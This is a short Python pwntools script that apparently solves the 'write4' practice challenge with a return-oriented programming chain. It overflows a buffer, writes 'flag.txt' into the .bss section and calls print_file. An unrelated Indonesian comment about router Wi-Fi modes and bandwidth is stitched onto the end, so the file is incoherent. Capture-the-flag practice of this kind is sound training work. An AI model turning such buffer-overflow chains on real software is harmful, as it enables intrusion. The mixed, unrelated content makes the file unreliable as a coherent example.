from pwn import *

p = ELF('./write4')
r = process('./write4')

gadgets = p.symbols['usefulGadgets']
printFlag = p.symbols['print_file']
bss = 0x000000000601038
pop_r14_r15 = 0x0000000000400690
pop_rdi = 0x0000000000400693
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop rdi 0x%x' %pop_rdi)
log.info('mov r14 r15 0x%x' %gadgets)
log.info('pop r14 r15 0x%x' %pop_r14_r15)
log.info('bss 0x%x' %bss)
junk = b'X'*40
payload = junk
payload += p64(pop_r14_r15)
payload += p64(bss)
payload += b'flag.txt'
payload += p64(gadgets)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(printFlag)
r.sendline(payload)
r.interactive()

"""
mau bertanya pak.. setelah saya melihat config router didapatkan 
Mode Mixed(802.11b+802.11g+802.11n)
setelah saya cek informasi bandwidth ternyata 10Mbps
apakah perlu diganti ke 802.11n atau 802.11g only pak?
"""